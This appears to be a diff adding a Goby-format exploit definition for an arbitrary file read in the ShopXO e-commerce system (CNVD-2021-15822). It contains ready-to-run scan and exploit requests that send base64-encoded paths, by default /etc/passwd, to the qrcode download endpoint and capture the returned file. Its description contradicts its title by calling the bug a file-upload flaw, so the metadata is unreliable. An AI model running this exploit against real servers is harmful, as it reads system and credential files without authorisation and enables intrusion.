@@ -1,0 +1,82 @@
+{
+      "Name": "ShopXO download 任意文件读取漏洞 CNVD-2021-15822",
+      "Level": "2",
+      "Tags": [],
+      "GobyQuery": "(title='ShopXO')",
+      "Description": "ShopXO是一套开源的企业级开源电子商务系统。\nShopXO存在文件上传漏洞，攻击者可利用该漏洞获取网站服务器控制权。",
+      "Product": "ShopXO",
+      "Homepage": "https://www.shopxo.net",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "L2V0Yy9wYXNzd2Q=",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/index.php?s=/index/qrcode/download/url/{{{Cmd}}}",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+		],
+      "PostTime": "2021-06-02 14:48:55",
+      "GobyVersion": "1.8.268"
+}
